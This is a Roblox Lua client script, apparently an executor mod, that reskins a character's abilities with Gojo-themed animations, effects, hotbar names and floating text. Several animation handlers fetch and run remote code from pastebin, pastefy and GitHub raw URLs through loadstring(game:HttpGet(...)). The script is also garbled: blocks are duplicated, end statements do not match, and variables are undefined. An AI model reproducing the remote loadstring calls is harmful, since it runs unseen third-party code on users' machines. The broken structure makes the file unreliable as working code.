-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

-- Local Player
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Color tweening function
local function tweenColor(imageLabel, startColor, endColor, duration)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true)
    local goal = {ImageColor3 = endColor}
    local tween = TweenService:Create(imageLabel, tweenInfo, goal)
    tween:Play()
end

-- GUI and color adjustment function
local function updateBarColor()
    -- Find the ScreenGui on the screen
    local screenGui = playerGui:FindFirstChild("ScreenGui")
    if not screenGui then return end

    -- Find the MagicHealth Frame
    local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")
    if not magicHealthFrame then return end

    -- Find the Health Frame
    local healthFrame = magicHealthFrame:FindFirstChild("Health")
    if not healthFrame then return end

    -- Find the Bar Frame
    local barFrame = healthFrame:FindFirstChild("Bar")
    if not barFrame then return end

    -- Find the ImageLabel with ImageColor3 property inside the Bar Frame
    local imageLabel = barFrame:FindFirstChild("Bar")
    if not imageLabel or not imageLabel:IsA("ImageLabel") then return end

    -- Set initial color to dark red
    imageLabel.ImageColor3 = Color3.fromRGB(0, 255, 255) -- Dark red

    -- Smooth transition from dark red to none
    tweenColor(imageLabel, Color3.fromRGB(0, 255, 255), Color3.fromRGB(127, 255, 212), 2)
end

-- Check the GUI again when the character resets
local function onCharacterAdded(character)
    -- Update the GUI
    updateBarColor()
end

-- Check the local player's character
local function onPlayerAdded()
    local character = player.Character or player.CharacterAdded:Wait()
    onCharacterAdded(character)

    -- Check again when the character changes
    player.CharacterAdded:Connect(onCharacterAdded)
end

-- Check when the player is added
Players.PlayerAdded:Connect(onPlayerAdded)
if player then
    onPlayerAdded()
end
local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("1").Base

local ToolName = baseButton.ToolName


ToolName.Text = "LimitLess Art"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("2").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Speedy Barrage"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("3").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Swift Kick"


local player = game.Players.LocalPlayer

local playerGui = player.PlayerGui

local hotbar = playerGui:FindFirstChild("Hotbar")

local backpack = hotbar:FindFirstChild("Backpack")

local hotbarFrame = backpack:FindFirstChild("Hotbar")

local baseButton = hotbarFrame:FindFirstChild("4").Base

local ToolName = baseButton.ToolName


ToolName.Text = "Reversal Red"


local Players = game:GetService("Players")

local player = Players.LocalPlayer

local playerGui = player:WaitForChild("PlayerGui")


local function findGuiAndSetText()

    local screenGui = playerGui:FindFirstChild("ScreenGui")

    if screenGui then

        local magicHealthFrame = screenGui:FindFirstChild("MagicHealth")

        if magicHealthFrame then

            local textLabel = magicHealthFrame:FindFirstChild("TextLabel")

            if textLabel then

                textLabel.Text = "SIX EYES"

            end

        end

    end

end


playerGui.DescendantAdded:Connect(findGuiAndSetText)

findGuiAndSetText()


local animationId = 10468665991


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18903642853"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 3.6


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.4)
task.wait(0.7)
local location2 = game.ReplicatedStorage.Resources.Sorcerer["LimitlessBarrier"].Core.BarrierFX
local vfx2 = location2:Clone()
vfx2.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]

-- Emit particles for the second effect
for _, child in ipairs(vfx2:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child:Emit(20)
        child.Enabled = true
    end
end

-- Destroy the second effect after 1 second
task.delay(1, function()
    vfx2:Destroy()
end)


-- Third effect (Limitless Barrier Core Appear)
local location3 = game.ReplicatedStorage.Resources.Sorcerer["LimitlessBarrier"].Core.Appear
local vfx3 = location3:Clone()
vfx3.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]

local location = game.ReplicatedStorage.Resources.Sorcerer["WallFX"].FirstSlam.Attachment
local vfx = location:Clone()
vfx.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]

for _, child in ipairs(vfx:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child:Emit(1)
        child.Enabled = true
    end
end

wait(0.5)

vfx:Destroy()

task.wait(0.1)
loadstring(game:HttpGet('https://pastebin.com/raw/bynn9gGH'))()
    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10466974800


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://13560306510"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(3)

task.wait(0.1)
loadstring(game:HttpGet('https://pastebin.com/raw/bynn9gGH'))()

    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10471336737


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then


local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18181348446"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)

task.wait(0.3)
local flash = Game.ReplicatedStorage.Resources.KJEffects.DropkickExtra["firstHit"].Attachment:Clone()
flash.Parent = game.Players.LocalPlayer.Character["Left Leg"]
for _, child in ipairs(flash:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child:Emit(4) -- Emit 1 particle
    end
end
task.wait(0.1)
local Sound = Instance.new("Sound") 
        Sound.Parent = character 
        Sound.SoundId = "rbxassetid://18443813318" 
        Sound.Playing = true 
        spawn(function()
        wait(0.7) 
        debounce = true 
        end) 
        playAnim:Play() 
        playAnim:AdjustSpeed(0.3) 
        wait(0.3) 
        playAnim:AdjustSpeed(1) 
        local Players = game:GetService("Players") 
        local Character = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait() 
        local animationPlayed = true

task.wait(0.1)
loadstring(game:HttpGet('https://pastebin.com/raw/bynn9gGH'))()

    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 12510170988


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://15090032390"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 1


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.001)

task.wait(0.3)
local fx7 = Game.ReplicatedStorage.Resources.CrabBeam["Explo"].Explo.Attachment:Clone()
fx7.Parent = game.Players.LocalPlayer.Character["Torso"]
for _, child in ipairs(fx7:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child:Emit(3) -- Emit 1 particle
    end
end
task.wait(0.7)
local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://18896229321"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 5.3


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(1)
coroutine.wrap(function()
    -- Ensure the necessary services are available
    local ts = game:GetService("TweenService")
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    -- Create the BillboardGui and its components
    local Dialogue = Instance.new("BillboardGui")
    local Chat1 = Instance.new("Frame")
    local Sub = Instance.new("TextLabel")

    -- Configure the BillboardGui
    Dialogue.Active = true
    Dialogue.Size = UDim2.new(15, 0, 15, 0)
    Dialogue.StudsOffset = Vector3.new(0, 0, 2) -- Adjust the offset to make it visible
    Dialogue.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Dialogue.Name = "Dialogue"
    Dialogue.Parent = humanoidRootPart

    -- Configure the frame inside the BillboardGui
    Chat1.AnchorPoint = Vector2.new(0.5, 0.5)
    Chat1.BackgroundColor3 = Color3.new(1, 1, 1)
    Chat1.BorderColor3 = Color3.new(0, 0, 0)
    Chat1.BorderSizePixel = 2
    Chat1.Position = UDim2.new(0.600000024, 0, -0.2, 0) -- Adjust the position for visibility
    Chat1.Size = UDim2.new(0.100000001, 0, 0.200000003, 0)
    Chat1.Name = "Chat1"
    Chat1.BackgroundTransparency = 1
    Chat1.Parent = Dialogue

    -- Configure the TextLabel inside the frame
    Sub.FontFace = Font.new("rbxassetid://12187375716", Enum.FontWeight.Bold, Enum.FontStyle.Italic)
    Sub.Text = "Reversal Red"
    Sub.TextColor3 = Color3.new(0, 0, 0)
    Sub.TextScaled = true
    Sub.TextSize = 14
    Sub.TextWrapped = true
    Sub.AnchorPoint = Vector2.new(0.5, 0.5)
    Sub.BackgroundColor3 = Color3.new(1, 1, 1)
    Sub.TextTransparency = 1
    Sub.BorderColor3 = Color3.new(0, 0, 0)
    Sub.BorderSizePixel = 0
    Sub.Position = UDim2.new(0.5, 0, 0.5, 0)
    Sub.Size = UDim2.new(0.850000024, 0, 0.349999994, 0)
    Sub.Name = "Sub"
    Sub.Parent = Chat1
    Sub.BackgroundTransparency = 1

    -- Ensure cleanup of the BillboardGui elements after some time
    game.Debris:AddItem(Chat1, 25)
    game.Debris:AddItem(Sub, 25)

    -- Define the tweenProperty function if missing
    local function tweenProperty(object, properties, time)
        local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = ts:Create(object, tweenInfo, properties)
        tween:Play()
        return tween
    end

    -- Animations for transparency and positioning
    tweenProperty(Chat1, {BackgroundTransparency = 0}, 1)
    tweenProperty(Sub, {TextTransparency = 0}, 1)
    tweenProperty(Chat1, {Position = UDim2.new(0.6, 0, 0.4, 0)}, 1)
    task.wait(2)
    tweenProperty(Chat1, {BackgroundTransparency = 1}, 2)
    tweenProperty(Sub, {TextTransparency = 1}, 2)
end)()
    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 11343318134


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()
local workspace = game.Workspace
 Players = game:GetService("Players")
 local speaker = Players.LocalPlayer
 workspace.CurrentCamera:remove()
     wait(0.1)
     workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
     workspace.CurrentCamera.CameraType = "Custom"
     speaker.CameraMinZoomDistance = 0.5
     speaker.CameraMaxZoomDistance = 400
     speaker.CameraMode = "Classic"
     speaker.Character.Head.Anchored = false
end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18459183268"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0

Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1)
local assetId = 17352290656 -- Replace with the actual Asset ID
local effect = game:GetObjects("rbxassetid://" .. assetId)[1]
local soundId = "rbxassetid://6667923288" -- Replace YOUR_SOUND_ID with the actual ID of the sound you want to play

local sound = Instance.new("Sound") -- Create a new Sound instance
sound.SoundId = soundId -- Set the SoundId property to the asset ID
sound.Parent = game.Workspace -- Parent it to Workspace or any other service
sound:Play() -- Play the sound

if effect then
    -- Attach to the player's torso (you can change this to any other part, like "Head" or "HumanoidRootPart")
    local character = game.Players.LocalPlayer.Character
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso") -- Depending on R6 or R15

    if torso then
        -- Parent the effect to the torso
        effect.Parent = torso

        -- Adjust the position to be closer
 effect.CFrame = torso.CFrame * CFrame.new(0, 32, -1) -- Change the last value to move the effect closer or further away (negative value moves it closer)

  
task.wait(4.3)

local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://16699717165"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 4


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(0.1)

wait(2)
        effect:Destroy()
    end
end

    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 local animationId = 11365563255
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild("Humanoid")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild("Humanoid")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()


end
 
 
local AnimAnim = Instance.new("Animation")
 
AnimAnim.AnimationId = "rbxassetid://18459183268"
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 0
 
Anim:Play()
 
Anim.TimePosition = startTime

Anim:AdjustSpeed(1)

loadstring(game:HttpGet('https://pastefy.app/iqiWRUnd/raw'))()

task.wait(0.1)

local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://18897115785"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 0


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(1.2)
local startTime = tick() 
local duration = 4  

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local floatSpeed = 38 
local duration = 4 

local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
if humanoidRootPart then
    local startTime = tick()
    while tick() - startTime < duration do
        wait(0.01) 
        humanoidRootPart.CFrame = humanoidRootPart.CFrame + humanoidRootPart.CFrame.LookVector * floatSpeed * 0.1

    end
end
    end
 
end
humanoid.AnimationPlayed:Connect(onAnimationPlayed) ---blue

local animationId = 13927612951


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://15121659862"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.5)

    end

end
humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 15955393872


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://17861844708"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1.5)
-- Aqua color sequence (cyan and light blue)
local aqua = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)), -- cyan
    ColorSequenceKeypoint.new(1, Color3.fromRGB(127, 255, 212)) -- light aqua
}
local red4 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].EyeEmit:Clone()
red4.Parent = game.Players.LocalPlayer.Character["Head"]
    for _, child in ipairs(red4:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a 
        child.Color = aqua -- Change particle color to aqua
            child:Emit(20) -- Emit 20 particles
        end
    end
task.wait(0.1)

local location2 = game.ReplicatedStorage.Resources.Sorcerer["LimitlessBarrier"].Core.BarrierFX
local vfx2 = location2:Clone()
vfx2.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]

-- Emit particles for the second effect
for _, child in ipairs(vfx2:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child:Emit(20)
        child.Enabled = true
    end
end

-- Destroy the second effect after 1 second
task.delay(2, function()
vfx2:Destroy()    
end)

task.wait(1.8)

local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://18903642853"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 3.5


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(0.4)

local location2 = game.ReplicatedStorage.Resources.Sorcerer["LimitlessBarrier"].Core.BarrierFX
local vfx2 = location2:Clone()
vfx2.Parent = game.Players.LocalPlayer.Character["HumanoidRootPart"]

-- Emit particles for the second effect
for _, child in ipairs(vfx2:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child:Emit(1)
        child.Enabled = true
    end
end

-- Destroy the second effect after 1 second
task.delay(1, function()
vfx2:Destroy()    
end)

task.wait(1)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local character = localPlayer.Character
local head = character:FindFirstChild("Head")
local torso = character:FindFirstChild("Torso")

if head and torso then
    local final1 = ReplicatedStorage.Resources.Sorcerer["WallFX"].Final.At:Clone()
    final1.Parent = head
    for _, child in ipairs(final1:GetChildren()) do
        if child:IsA("ParticleEmitter") then
            child:Emit(5)
        end
    end

    local final4 = ReplicatedStorage.Resources.Sorcerer["WallFX"].Final.Attachment:Clone()
    final4.Parent = HumanoidRootPart
    for _, child in ipairs(final4:GetChildren()) do
        if child:IsA("ParticleEmitter") then
            child:Emit(1)
        end
    end
end
task.wait(0.1)
coroutine.wrap(function()
    -- Ensure the necessary services are available
    local ts = game:GetService("TweenService")
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    -- Create the BillboardGui and its components
    local Dialogue = Instance.new("BillboardGui")
    local Chat1 = Instance.new("Frame")
    local Sub = Instance.new("TextLabel")

    -- Configure the BillboardGui
    Dialogue.Active = true
    Dialogue.Size = UDim2.new(15, 0, 15, 0)
    Dialogue.StudsOffset = Vector3.new(0, 0, 2) -- Adjust the offset to make it visible
    Dialogue.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Dialogue.Name = "Dialogue"
    Dialogue.Parent = humanoidRootPart

    -- Configure the frame inside the BillboardGui
    Chat1.AnchorPoint = Vector2.new(0.5, 0.5)
    Chat1.BackgroundColor3 = Color3.new(1, 1, 1)
    Chat1.BorderColor3 = Color3.new(0, 0, 0)
    Chat1.BorderSizePixel = 2
    Chat1.Position = UDim2.new(0.600000024, 0, -0.2, 0) -- Adjust the position for visibility
    Chat1.Size = UDim2.new(0.100000001, 0, 0.200000003, 0)
    Chat1.Name = "Chat1"
    Chat1.BackgroundTransparency = 1
    Chat1.Parent = Dialogue

    -- Configure the TextLabel inside the frame
    Sub.FontFace = Font.new("rbxassetid://12187375716", Enum.FontWeight.Bold, Enum.FontStyle.Italic)
    Sub.Text = "next.."
    Sub.TextColor3 = Color3.new(0, 0, 0)
    Sub.TextScaled = true
    Sub.TextSize = 14
    Sub.TextWrapped = true
    Sub.AnchorPoint = Vector2.new(0.5, 0.5)
    Sub.BackgroundColor3 = Color3.new(1, 1, 1)
    Sub.TextTransparency = 1
    Sub.BorderColor3 = Color3.new(0, 0, 0)
    Sub.BorderSizePixel = 0
    Sub.Position = UDim2.new(0.5, 0, 0.5, 0)
    Sub.Size = UDim2.new(0.850000024, 0, 0.349999994, 0)
    Sub.Name = "Sub"
    Sub.Parent = Chat1
    Sub.BackgroundTransparency = 1

    -- Ensure cleanup of the BillboardGui elements after some time
    game.Debris:AddItem(Chat1, 25)
    game.Debris:AddItem(Sub, 25)

    -- Define the tweenProperty function if missing
    local function tweenProperty(object, properties, time)
        local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = ts:Create(object, tweenInfo, properties)
        tween:Play()
        return tween
    end

    -- Animations for transparency and positioning
    tweenProperty(Chat1, {BackgroundTransparency = 0}, 1)
    tweenProperty(Sub, {TextTransparency = 0}, 1)
    tweenProperty(Chat1, {Position = UDim2.new(0.6, 0, 0.4, 0)}, 1)
    task.wait(2)
    tweenProperty(Chat1, {BackgroundTransparency = 1}, 2)
    tweenProperty(Sub, {TextTransparency = 1}, 2)
end)()
    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)

local animationId = 12983333733 ---hollow purple 


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()
local workspace = game.Workspace
 Players = game:GetService("Players")
 local speaker = Players.LocalPlayer
 workspace.CurrentCamera:remove()
     wait(0.1)
     workspace.CurrentCamera.CameraSubject = speaker.Character:FindFirstChildWhichIsA('Humanoid')
     workspace.CurrentCamera.CameraType = "Custom"
     speaker.CameraMinZoomDistance = 0.5
     speaker.CameraMaxZoomDistance = 400
     speaker.CameraMode = "Classic"
     speaker.Character.Head.Anchored = false
end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18897551628"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.3)

loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Purple'))()  

task.wait(0.1)

loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Manga'))()
task.wait(2)

local AnimAnim2 = Instance.new("Animation")

AnimAnim2.AnimationId = "rbxassetid://13071982935"

local Anim2 = Humanoid:LoadAnimation(AnimAnim2)


local startTime = 2.7


Anim:Stop()

Anim2:Play()

Anim2:AdjustSpeed(0)

Anim2.TimePosition = startTime

Anim2:AdjustSpeed(0.5)
    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 12447707844


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://18897551628"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(0.5)
-- Aqua color sequence (cyan and light blue)
local aqua = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)), -- cyan
    ColorSequenceKeypoint.new(1, Color3.fromRGB(127, 255, 212)) -- light aqua
}

local fx3 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmFX:Clone()
fx3.Parent = game.Players.LocalPlayer.Character["Left Arm"]
for _, child in ipairs(fx3:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child.Color = aqua -- Change particle color to aqua
        child:Emit(1) -- Emit 1 particle
    end
end
task.wait(0.1)
local fx7 = game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmFX:Clone()
fx7.Parent = game.Players.LocalPlayer.Character["Right Arm"]
for _, child in ipairs(fx7:GetChildren()) do
    if child:IsA("ParticleEmitter") then
        child.Color = aqua -- Change particle color to aqua
        child:Emit(1) -- Emit 1 particle
    end
end
        
wait(1)
fx3:Destroy()
fx7:Destroy()

task.wait(0.1)
loadstring(game:HttpGet('https://pastebin.com/raw/SmCx1WXf'))()

task.wait(0.1)
coroutine.wrap(function()
    -- Ensure the necessary services are available
    local ts = game:GetService("TweenService")
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    -- Create the BillboardGui and its components
    local Dialogue = Instance.new("BillboardGui")
    local Chat1 = Instance.new("Frame")
    local Sub = Instance.new("TextLabel")

    -- Configure the BillboardGui
    Dialogue.Active = true
    Dialogue.Size = UDim2.new(15, 0, 15, 0)
    Dialogue.StudsOffset = Vector3.new(0, 0, 2) -- Adjust the offset to make it visible
    Dialogue.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    Dialogue.Name = "Dialogue"
    Dialogue.Parent = humanoidRootPart

    -- Configure the frame inside the BillboardGui
    Chat1.AnchorPoint = Vector2.new(0.5, 0.5)
    Chat1.BackgroundColor3 = Color3.new(1, 1, 1)
    Chat1.BorderColor3 = Color3.new(0, 0, 0)
    Chat1.BorderSizePixel = 2
    Chat1.Position = UDim2.new(0.600000024, 0, -0.2, 0) -- Adjust the position for visibility
    Chat1.Size = UDim2.new(0.100000001, 0, 0.200000003, 0)
    Chat1.Name = "Chat1"
    Chat1.BackgroundTransparency = 1
    Chat1.Parent = Dialogue

    -- Configure the TextLabel inside the frame
    Sub.FontFace = Font.new("rbxassetid://12187375716", Enum.FontWeight.Bold, Enum.FontStyle.Italic)
    Sub.Text = "Yowai mo"
    Sub.TextColor3 = Color3.new(0, 0, 0)
    Sub.TextScaled = true
    Sub.TextSize = 14
    Sub.TextWrapped = true
    Sub.AnchorPoint = Vector2.new(0.5, 0.5)
    Sub.BackgroundColor3 = Color3.new(1, 1, 1)
    Sub.TextTransparency = 1
    Sub.BorderColor3 = Color3.new(0, 0, 0)
    Sub.BorderSizePixel = 0
    Sub.Position = UDim2.new(0.5, 0, 0.5, 0)
    Sub.Size = UDim2.new(0.850000024, 0, 0.349999994, 0)
    Sub.Name = "Sub"
    Sub.Parent = Chat1
    Sub.BackgroundTransparency = 1

    -- Ensure cleanup of the BillboardGui elements after some time
    game.Debris:AddItem(Chat1, 25)
    game.Debris:AddItem(Sub, 25)

    -- Define the tweenProperty function if missing
    local function tweenProperty(object, properties, time)
        local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = ts:Create(object, tweenInfo, properties)
        tween:Play()
        return tween
    end

    -- Animations for transparency and positioning
    tweenProperty(Chat1, {BackgroundTransparency = 0}, 1)
    tweenProperty(Sub, {TextTransparency = 0}, 1)
    tweenProperty(Chat1, {Position = UDim2.new(0.6, 0, 0.4, 0)}, 1)
    task.wait(2)
    tweenProperty(Chat1, {BackgroundTransparency = 1}, 2)
    tweenProperty(Sub, {TextTransparency = 1}, 2)
end)()
    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10479335397


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


